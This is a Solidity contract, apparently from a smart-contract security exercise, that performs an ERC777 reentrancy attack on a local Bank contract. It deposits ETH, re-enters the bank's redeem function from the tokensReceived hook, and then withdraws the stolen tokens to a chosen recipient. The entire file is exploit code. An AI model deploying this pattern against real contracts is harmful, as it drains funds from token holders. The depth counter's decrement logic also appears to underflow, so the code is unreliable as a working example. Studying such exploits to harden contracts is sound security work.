// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "@openzeppelin/contracts/access/AccessControl.sol";
import "@openzeppelin/contracts/token/ERC777/ERC777.sol";
import "@openzeppelin/contracts/token/ERC777/IERC777Recipient.sol";
import "@openzeppelin/contracts/interfaces/IERC1820Registry.sol";
import "./Bank.sol";

contract Attacker is AccessControl, IERC777Recipient {
    bytes32 public constant ATTACKER_ROLE = keccak256("ATTACKER_ROLE");
    IERC1820Registry private _erc1820 = IERC1820Registry(
        0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24
    ); // EIP1820 registry address
    bytes32 private constant TOKENS_RECIPIENT_INTERFACE_HASH = keccak256("ERC777TokensRecipient");
    uint8 private depth = 0;
    uint8 private constant max_depth = 2;

    Bank public bank;

    event Recurse(uint8 depth);

    constructor(address admin) {
        _grantRole(DEFAULT_ADMIN_ROLE, admin);
        _grantRole(ATTACKER_ROLE, admin);
        // Register this contract as an ERC777TokensRecipient
        _erc1820.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
        bank = Bank(bank_address);
    }

    /*
        The main attack function that starts the reentrancy attack.
        'amt' is the amount of ETH to deposit initially.
    */
    function attack(uint256 amt) external payable onlyRole(ATTACKER_ROLE) {
        require(address(bank) != address(0), "Target bank not set");
        require(msg.value >= amt, "Insufficient ETH sent");

        // Deposit ETH to receive tokens
        bank.deposit{value: amt}();

        // Approve bank to spend our tokens
        ERC777 token = bank.token();
        token.approve(address(bank), token.balanceOf(address(this)));

        // Start reentrancy attack by calling redeem
        bank.redeem(token.balanceOf(address(this)));
    }

    /*
        After the attack, withdraw the stolen tokens to the recipient.
    */
    function withdraw(address recipient) external onlyRole(ATTACKER_ROLE) {
        ERC777 token = bank.token();
        uint256 balance = token.balanceOf(address(this));
        require(balance > 0, "No tokens to withdraw");
        token.send(recipient, balance, "");
    }

    /*
        This function is called when the Bank contract sends MCITR tokens.
    */
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        // Ensure the function is called by the expected token contract
        require(msg.sender == address(bank.token()), "Invalid token sender");

        if (depth < max_depth) {
            depth++;

            // Approve bank to spend our tokens
            ERC777 token = bank.token();
            token.approve(address(bank), token.balanceOf(address(this)));

            // Reentrantly call redeem to exploit reentrancy
            bank.redeem(token.balanceOf(address(this)));

            emit Recurse(depth);
        }
        depth--;
    }
}
